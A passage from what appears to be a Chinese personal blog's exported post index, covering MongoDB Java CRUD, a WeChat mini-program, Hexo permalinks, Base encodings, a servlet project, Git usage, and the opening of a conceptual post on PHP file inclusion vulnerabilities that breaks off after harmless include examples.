class="number">200.131</span>);</span><br><span class="line">        <span class="comment">// 2.选择数据库</span></span><br><span class="line">        MongoDatabase commentdb = mongoClient.getDatabase(<span class="string">&quot;commentdb&quot;</span>);</span><br><span class="line">        <span class="comment">// 3.获取集合        </span></span><br><span class="line">        comment = commentdb.getCollection(<span class="string">&quot;comment&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询所有数据db.comment.find()</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 4.使用集合进行查询</span></span><br><span class="line">        FindIterable&lt;Document&gt; documents = comment.find();</span><br><span class="line">        <span class="comment">// 5.处理查询结果集</span></span><br><span class="line">        <span class="keyword">for</span>(Document document : documents)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;_id:&quot;</span> + document.get(<span class="string">&quot;_id&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;content:&quot;</span> + document.get(<span class="string">&quot;content&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;userid:&quot;</span> + document.get(<span class="string">&quot;userid&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;thumbup:&quot;</span> + document.get(<span class="string">&quot;thumbup&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 6.释放资源</span></span><br><span class="line">        mongoClient.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-2-根据条件查询"><a href="#3-2-根据条件查询" class="headerlink" title="3.2 根据条件查询"></a>3.2 根据条件查询</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//封装查询条件</span></span><br><span class="line">    BasicDBObject bson = <span class="keyword">new</span> BasicDBObject(<span class="string">&quot;_id&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="comment">//执行查询</span></span><br><span class="line">    FindIterable&lt;Document&gt; documents = comment.find(bson);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Document document : documents)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;_id:&quot;</span> + document.get(<span class="string">&quot;_id&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;content:&quot;</span> + document.get(<span class="string">&quot;content&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;userid:&quot;</span> + document.get(<span class="string">&quot;userid&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;thumbup:&quot;</span> + document.get(<span class="string">&quot;thumbup&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-3-新增"><a href="#3-3-新增" class="headerlink" title="3.3 新增"></a>3.3 新增</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//封装新增数据</span></span><br><span class="line">    Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;_id&quot;</span>,<span class="string">&quot;6&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;content:&quot;</span>,<span class="string">&quot;新增测试&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;userid&quot;</span>,<span class="string">&quot;1019&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;thumbup&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    <span class="comment">// 封装新增文档对象</span></span><br><span class="line">    Document document = <span class="keyword">new</span> Document(map);</span><br><span class="line">    <span class="comment">// 执行新增操作</span></span><br><span class="line">    comment.insertOne(document);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-4-修改"><a href="#3-4-修改" class="headerlink" title="3.4 修改"></a>3.4 修改</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 创建修改的条件</span></span><br><span class="line">    BasicDBObject filter = <span class="keyword">new</span> BasicDBObject(<span class="string">&quot;_id&quot;</span>,<span class="string">&quot;6&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建修改的值</span></span><br><span class="line">    BasicDBObject update = <span class="keyword">new</span> BasicDBObject(<span class="string">&quot;$set&quot;</span>,<span class="keyword">new</span> Document(<span class="string">&quot;userid&quot;</span>,<span class="string">&quot;999&quot;</span>));</span><br><span class="line">    <span class="comment">// 执行修改</span></span><br><span class="line">    comment.updateOne(filter,update);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-5-删除"><a href="#3-5-删除" class="headerlink" title="3.5 删除"></a>3.5 删除</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 创建删除条件</span></span><br><span class="line">    BasicDBObject bson = <span class="keyword">new</span> BasicDBObject(<span class="string">&quot;_id&quot;</span>,<span class="string">&quot;6&quot;</span>);</span><br><span class="line">    <span class="comment">// 执行删除</span></span><br><span class="line">    comment.deleteOne(bson);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="4-文章评论实现"><a href="#4-文章评论实现" class="headerlink" title="4 文章评论实现"></a>4 文章评论实现</h2><p>　　SpringDataMongoDB是SpringData家族成员之一，用于操作MongoDB的持久层框架，封装了底层的mongodb-driver。本功能使用SpringDataMongoDB进行开发。</p>
<h3 id="4-1-需求分析"><a href="#4-1-需求分析" class="headerlink" title="4.1 需求分析"></a>4.1 需求分析</h3><p>评论集合结构：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>专栏文章评论</th>
<th>comment</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>字段名称</td>
<td>字段含义</td>
<td>字段类型</td>
<td>备注</td>
</tr>
<tr>
<td>_id</td>
<td>ID</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>articleid</td>
<td>文章ID</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>content</td>
<td>评论内容</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>userid</td>
<td>评论人ID</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>parentid</td>
<td>评论ID</td>
<td>文本</td>
<td>如果为0表示文章的顶级评论</td>
</tr>
<tr>
<td>publishdate</td>
<td>评论日期</td>
<td>日期</td>
<td></td>
</tr>
<tr>
<td>thumbup</td>
<td>点赞数</td>
<td>数字</td>
</tr>
</tbody>
</table>
</div>
<p>需要实现以下功能：</p>
<ol>
<li>基本增删改查API</li>
<li>根据文章id查询评论</li>
<li>评论点赞</li>
</ol>
]]></content>
      <categories>
        <category>SpringBoot项目</category>
      </categories>
  </entry>
  <entry>
    <title>小程序开发</title>
    <url>/post/8d10680e.html</url>
    <content><![CDATA[<p>　　2020年寒假在培训的时候记录的小程序项目<span id="more"></span></p>
<h1 id="1-首页"><a href="#1-首页" class="headerlink" title="1.首页"></a>1.首页</h1><h2 id="1-1-搜索框组件"><a href="#1-1-搜索框组件" class="headerlink" title="1.1 搜索框组件"></a>1.1 搜索框组件</h2><h2 id="1-2-轮播图"><a href="#1-2-轮播图" class="headerlink" title="1.2 轮播图"></a>1.2 轮播图</h2><h3 id="1-2-1-index-js"><a href="#1-2-1-index-js" class="headerlink" title="1.2.1 index.js"></a>1.2.1 index.js</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 页面开始加载，就会触发</span></span><br><span class="line">onLoad: <span class="function"><span class="keyword">function</span> (<span class="params">opitons</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 1.发送异步请求获取轮播图数据</span></span><br><span class="line">  <span class="keyword">var</span> reqTask = wx.request(&#123;</span><br><span class="line">    url: <span class="string">&#x27;https://api-hmugo-web.itheima.net/api/public/v1/home/swiperdata&#x27;</span>,</span><br><span class="line">    success: <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="1-2-2-index-wxml"><a href="#1-2-2-index-wxml" class="headerlink" title="1.2.2 index.wxml"></a>1.2.2 index.wxml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 轮播图开始 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;index_swiper&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">       1.swiper标签存在默认的宽度和高度    100% * 150px</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       2.image标签默认的高度和宽度     320px * 240px </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       3.设计图片和轮播图</span></span><br><span class="line"><span class="comment">           3.1 先看原图宽高    750 * 340</span></span><br><span class="line"><span class="comment">           3.2 让图片高度自适应    宽度等于100%</span></span><br><span class="line"><span class="comment">           3.3 让swiper标签的高度  变成和图片一样高</span></span><br><span class="line"><span class="comment">       4.图片标签</span></span><br><span class="line"><span class="comment">         mode属性 渲染模式</span></span><br><span class="line"><span class="comment">           widthFix 让图片的标签宽高和图片标签的内容的宽高都等比例发生变化</span></span><br><span class="line"><span class="comment">       --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">swiper</span> <span class="attr">autoplay</span> <span class="attr">indicator-dots</span> <span class="attr">circular</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">swiper-item</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;swiperList&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;goods_id&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">navigator</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;item.image_src&#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 轮播图结束 --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-3-index-wxss"><a href="#1-2-3-index-wxss" class="headerlink" title="1.2.3 index.wxss"></a>1.2.3 index.wxss</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.index_swiper</span> &#123;</span><br><span class="line">    <span class="selector-tag">swiper</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">750</span>rpx;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">340</span>rpx;</span><br><span class="line"></span><br><span class="line">        <span class="selector-tag">image</span> &#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2-导航条"><a href="#2-导航条" class="headerlink" title="2.导航条"></a>2.导航条</h1><h2 id="2-1-获取接口数据"><a href="#2-1-获取接口数据" class="headerlink" title="2.1 获取接口数据"></a>2.1 获取接口数据</h2><h2 id="2-2-页面布局"><a href="#2-2-页面布局" class="headerlink" title="2.2 页面布局"></a>2.2 页面布局</h2><h3 id="2-2-1-左右菜单"><a href="#2-2-1-左右菜单" class="headerlink" title="2.2.1 左右菜单"></a>2.2.1 左右菜单</h3><h3 id="2-2-2-点击效果"><a href="#2-2-2-点击效果" class="headerlink" title="2.2.2 点击效果"></a>2.2.2 点击效果</h3><h3 id="2-2-3-点击菜单切换内容"><a href="#2-2-3-点击菜单切换内容" class="headerlink" title="2.2.3 点击菜单切换内容"></a>2.2.3 点击菜单切换内容</h3><h2 id="2-3-商品列表Tabs组件"><a href="#2-3-商品列表Tabs组件" class="headerlink" title="2.3 商品列表Tabs组件"></a>2.3 商品列表Tabs组件</h2><h1 id="3-分类"><a href="#3-分类" class="headerlink" title="3.分类"></a>3.分类</h1><h1 id="4-购物车"><a href="#4-购物车" class="headerlink" title="4.购物车"></a>4.购物车</h1><h1 id="5-我的"><a href="#5-我的" class="headerlink" title="5.我的"></a>5.我的</h1>]]></content>
      <categories>
        <category>小程序</category>
      </categories>
      <tags>
        <tag>小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>博客文章链接优化</title>
    <url>/post/341885c6.html</url>
    <content><![CDATA[<p>　　hexo的默认永久链接在_config.yml里的配置permalink: :year/:month/:day/:title，这种链接会掺杂中文路径，导致url中出现中文，并不能够分享。<span id="more"></span></p>
<h1 id="安装hexo-abbrlink插件"><a href="#安装hexo-abbrlink插件" class="headerlink" title="安装hexo-abbrlink插件"></a>安装hexo-abbrlink插件</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-abbrlink <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<p>然后在_config.yml文件中修改permalink</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">post/:abbrlink.html</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="comment"># 算法：crc16(default) and crc32</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc32</span>  </span><br><span class="line">  <span class="comment"># 进制：dec(default) and hex</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">hex</span>    </span><br></pre></td></tr></table></figure>
<p>之后使用hexo clean清除静态文件，再使用hexo d -g重新生成静态文件，会自动在文章中加上abbrlink: ba5852c2</p>
]]></content>
  </entry>
  <entry>
    <title>常见的密码类型</title>
    <url>/post/ba5852c2.html</url>
    <content><![CDATA[<p>　　对Base家族密码类型做的一次总结<span id="more"></span></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>编码</th>
<th>格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>Base16（hex）</td>
<td>0-9，A-F，16位组成</td>
</tr>
<tr>
<td>Base32</td>
<td>A-Z，234567,32位组成</td>
</tr>
<tr>
<td>Base36</td>
<td>0-9，A-Z，36位组成</td>
</tr>
<tr>
<td>Base58</td>
<td>大小写字母和数字去除0(零)和O(大写o)、I(大写i)和l(小写L)</td>
</tr>
<tr>
<td>Base62</td>
<td>A-Z，a-z，0-9，62位组成的</td>
</tr>
<tr>
<td>Base64</td>
<td>大小写字母，0-9，+，-，64位组成的</td>
</tr>
<tr>
<td>Base85</td>
<td>与base64累死，字符集更大</td>
</tr>
<tr>
<td>Base91</td>
<td>从94个ASCⅡ字符中，忽略“-”，“\”，“’”，格式类似于@iH&lt;,{bdR2H;i6*Tm,Wx2izpx2!</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
  </entry>
  <entry>
    <title>房租管理系统</title>
    <url>/post/cedff539.html</url>
    <content><![CDATA[<p>　　在学校的三级课题实训期间，跟着做的一个基于servlet的项目，通过前后端传实现的增删改查<span id="more"></span></p>
<h1 id="2-项目演示"><a href="#2-项目演示" class="headerlink" title="2.项目演示"></a>2.项目演示</h1><p><img src="https://s3.ax1x.com/2021/01/11/s1zZKf.png" alt="s1zZKf.png" style="zoom: 50%;" /></p>
<p><img src="https://s3.ax1x.com/2021/01/11/s1zA2t.png" alt="s1zA2t.png" style="zoom: 50%;" /></p>
<p><img src="https://s3.ax1x.com/2021/01/11/s1zmqS.png" alt="s1zmqS.png" style="zoom: 33%;" /></p>
<p><img src="https://s3.ax1x.com/2021/01/11/s1zer8.png" alt="s1zer8.png" style="zoom: 50%;" /></p>
<p><img src="https://s3.ax1x.com/2021/01/11/s1zExP.png" alt="s1zExP.png" style="zoom:50%;" /></p>
<h1 id="3-CRUD功能实现"><a href="#3-CRUD功能实现" class="headerlink" title="3.CRUD功能实现"></a>3.CRUD功能实现</h1><h2 id="3-1-添加用户功能"><a href="#3-1-添加用户功能" class="headerlink" title="3.1 添加用户功能"></a>3.1 添加用户功能</h2><p>username，idnumber，tel，sex，registertime拿到也页面的参数数据，之后让dao层和service层发生联系，这时候可以定义一个boolean类型来保证不会重复添加同一个人</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//增加用户</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;</span><br><span class="line">    String username = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    String idnumber = req.getParameter(<span class="string">&quot;idnumber&quot;</span>);</span><br><span class="line">    String tel = req.getParameter(<span class="string">&quot;tel&quot;</span>);</span><br><span class="line">    String sex = req.getParameter(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line">    String registertime = req.getParameter(<span class="string">&quot;registertime&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否获得数据</span></span><br><span class="line">    System.out.println(username + idnumber + tel + sex + registertime + <span class="string">&quot;租户新增&quot;</span>);</span><br><span class="line"></span><br><span class="line">    RentUserService service = <span class="keyword">new</span> RentUserServiceImpl();</span><br><span class="line">    <span class="keyword">boolean</span> f = service.duplicate(idnumber);</span><br><span class="line">    <span class="comment">//输出是否是获得f值</span></span><br><span class="line">    System.out.println(f);</span><br><span class="line">    HttpSession session = req.getSession();</span><br><span class="line">    <span class="comment">//如果是真，已存在该用户，不能新增</span></span><br><span class="line">    <span class="keyword">if</span> (f) &#123;</span><br><span class="line">        session.setAttribute(<span class="string">&quot;err&quot;</span>, <span class="string">&quot;该用户已存在&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//重新输入</span></span><br><span class="line">            resp.sendRedirect(<span class="string">&quot;/XX/view/rentUser/edit.jsp&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaWeb项目</category>
      </categories>
  </entry>
  <entry>
    <title>提交代码到GitHub</title>
    <url>/post/a2535634.html</url>
    <content><![CDATA[<p>　　如何将Idea里面创建的项目提交到GitHub，在Gitee上操作大同小异。<span id="more"></span></p>
<p>在开始之前，我们需要在在本地创建一个文件夹，用来保存以后从github上拉去的仓库。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617005004-GIt%E6%93%8D%E4%BD%9C3.jpg" alt="GIt操作3"></p>
<p>然后，需要在Github新建一个仓库，用来保存项目代码，名字最好和IDEA项目的名字保持一致。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004625-GIt%E6%93%8D%E4%BD%9C1.jpg" alt="GIt操作1"></p>
<p>可以看到上面的仓库链接，</p>
<p>执行<code>git clone https://github.com/qnjy/finance_demo.git</code>命令，将仓库克隆到本地。需要现在GitLocalRepo文件夹下右键点击Git Bash Here。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004581-GIt%E6%93%8D%E4%BD%9C4.jpg" alt="GIt操作4"></p>
<p>本地就会出现一个以仓库命名的文件夹</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004577-GIt%E6%93%8D%E4%BD%9C5.jpg" alt="GIt操作5"></p>
<p>点开将.git文件夹复制到IDEA的项目里面，注意：如果看不到.git文件夹，就点击上方的查看-&gt;勾选已隐藏的项目</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004573-GIt%E6%93%8D%E4%BD%9C6.jpg" alt="GIt操作6"></p>
<p>使用IDEA打开项目，首先将IDEA终端设置为bash.exe，这个方便我们以后执行git命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004569-GIt%E6%93%8D%E4%BD%9C7.jpg" alt="GIt操作7"></p>
<p>执行<code>git status</code>查看文件的状态</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004565-GIt%E6%93%8D%E4%BD%9C8.jpg" alt="GIt操作8"></p>
<p>然后<code>git add .</code>添加文件到所有缓存区</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004562-GIt%E6%93%8D%E4%BD%9C.jpg" alt="GIt操作"></p>
<p>之后<code>git commit -m &quot;第一次提交&quot;</code>将缓存区的内容提交到本地仓库</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004553-GIt%E6%93%8D%E4%BD%9C10.jpg" alt="GIt操作10"></p>
<p>最后<code>git push</code>到远程仓库</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004547-GIt%E6%93%8D%E4%BD%9C11.jpg" alt="GIt操作11"></p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004542-GIt%E6%93%8D%E4%BD%9C12.jpg" alt="GIt操作12"></p>
<p><strong>Git文件操作</strong></p>
<blockquote>
<p>文件的四种状态</p>
</blockquote>
<p>版本控制就是对文件的版本控制，要对文件进行修改、提交等操作，首先要知道文件当前在什么状态，不然可能会提交了现在还不想提交的文件，或者要提交的文件没提交上。</p>
<ul>
<li><p>Untracked: 未跟踪, 此文件在文件夹中, 但并没有加入到git库, 不参与版本控制. 通过git add 状态变为Staged.</p>
</li>
<li><p>Unmodify: 文件已经入库, 未修改, 即版本库中的文件快照内容与文件夹中完全一致. 这种类型的文件有两种去处, 如果它被修改, 而变为Modified. 如果使用git rm移出版本库, 则成为Untracked文件</p>
</li>
<li><p>Modified: 文件已修改, 仅仅是修改, 并没有进行其他的操作. 这个文件也有两个去处, 通过git add可进入暂存staged状态, 使用git checkout 则丢弃修改过, 返回到unmodify状态, 这个git checkout即从库中取出文件, 覆盖当前修改 !</p>
</li>
<li><p>Staged: 暂存状态. 执行git commit则将修改同步到库中, 这时库中的文件和本地文件又变为一致, 文件为Unmodify状态. 执行git reset HEAD filename取消暂存, 文件状态为Modified</p>
</li>
</ul>
<blockquote>
<p>查看文件状态</p>
</blockquote>
<p>上面说文件有4种状态，通过如下命令可以查看到文件的状态：</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#查看指定文件状态</span></span><br><span class="line">git status [filename]</span><br><span class="line"><span class="meta">#查看所有文件状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="meta"># git add .                  添加所有文件到暂存区</span></span><br><span class="line"><span class="meta"># git commit -m &quot;消息内容&quot;    提交暂存区中的内容到本地仓库 -m 提交信息</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>忽略文件</p>
</blockquote>
<p>有些时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件，设计文件等</p>
<p>在主目录下建立”.gitignore”文件，此文件有如下规则：</p>
<ol>
<li><p>忽略文件中的空行或以井号（#）开始的行将会被忽略。</p>
</li>
<li><p>可以使用Linux通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,…}）代表可选的字符串等</p>
</li>
<li><p>如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。</p>
</li>
<li><p>如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在根目录下，而根目录的子目录中的文件不忽略。</p>
</li>
<li><p>如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。</p>
</li>
</ol>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#为注释</span></span><br><span class="line">*.txt         <span class="comment">#忽略所有 .txt结尾的文件,这样的话上传就不会被选中！</span></span><br><span class="line">!lib.txt       <span class="comment">#但lib.txt除外</span></span><br><span class="line">/temp        <span class="comment">#仅忽略项目根目录下的TODO文件,不包括其它目录</span></span><br><span class="line">build<span class="regexp">/        #忽略build/</span>目录下的所有文件</span><br><span class="line">doc<span class="regexp">/*.txt     #会忽略 doc/</span>notes.txt 但不包括 doc<span class="regexp">/server/</span>arch.txt</span><br></pre></td></tr></table></figure>
<p><strong>git分支操作</strong></p>
<p>git常用分支命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004511-GIt%E6%93%8D%E4%BD%9C13.png" alt="GIt操作13"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 列出所有本地分支</span></span><br><span class="line">git branch</span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出所有远程分支</span></span><br><span class="line">git branch -r</span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个分支，但依然停留在当前分支</span></span><br><span class="line">git branch [branch-name]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个分支，并切换到该分支</span></span><br><span class="line">git checkout -b [branch]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 合并指定分支到当前分支$ </span></span><br><span class="line">git merge [branch]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除分支$ </span></span><br><span class="line">git branch -d [branch-name]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除远程分支</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin --delete [branch-name]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -dr [remote/branch]</span></span><br></pre></td></tr></table></figure>
<p>IDEA操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617004531-GIt%E6%93%8D%E4%BD%9C12.jpg" alt="GIt操作12"></p>
<p>如果同一个文件在合并分支时都被修改了则会引起冲突：解决的办法是我们可以修改冲突文件后重新提交！选择要保留他的代码还是你的代码！</p>
<p>master主分支应该非常稳定，用来发布新版本，一般情况下不允许在上面工作，工作一般情况下在新建的dev分支上工作，工作完后，比如上要发布，或者说dev分支代码稳定后可以合并到主分支master上来。</p>
]]></content>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/post/4089de4e.html</url>
    <content><![CDATA[<p>　　网络安全内容方面的学习，了解了网站的文件包含漏洞<span id="more"></span></p>
<h1 id="什么是文件包含漏洞"><a href="#什么是文件包含漏洞" class="headerlink" title="什么是文件包含漏洞"></a>什么是文件包含漏洞</h1><p>　　php文件包含漏洞的产生原因是在通过php的函数引入文件时，使用了预想之外的文件，就可能导致文件泄露甚至恶意代码的注入。</p>
<h1 id="PHP文件包含的函数"><a href="#PHP文件包含的函数" class="headerlink" title="PHP文件包含的函数"></a>PHP文件包含的函数</h1><h2 id="1-四种函数理解"><a href="#1-四种函数理解" class="headerlink" title="1.四种函数理解"></a>1.四种函数理解</h2><p>创建inc.php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建include.php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is include.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建include_once.php文件，但是调用同一文件只调用第一次</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;./inc.php&quot;</span>);<span class="comment">//包含inc文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is include_once.php&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;./inc.php&quot;</span>;<span class="comment">//包含inc文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建require.php文件，如果包含失败，会报出错误信息，并终止脚本运行</p>
